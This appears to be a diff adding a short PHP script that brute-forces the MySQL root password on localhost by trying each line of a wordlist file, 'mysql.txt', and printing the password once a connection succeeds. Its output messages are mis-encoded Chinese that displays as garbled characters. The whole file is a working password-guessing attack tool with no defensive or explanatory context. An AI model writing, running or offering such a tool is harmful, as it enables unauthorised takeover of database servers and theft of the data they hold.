@@ -1,0 +1,17 @@
+<?
+set_time_limit(0);
+ $passwd=file("mysql.txt");
+ $strings=count($passwd);
+ for($i=0; $i<$strings; $i++){
+ $pass=$passwd[$i];
+ connect($pass);
+ }
+ echo "<br>É¨Ãè½áÊø<br>";
+
+ function connect($pass)
+ {
+ $conn=@mysql_connect("localhost","root",$pass);
+ if($conn){echo "<br>µÃµ½rootÃÜÂë:$pass<br>";exit();
+ }else{echo "|";}
+ }
+ ?>
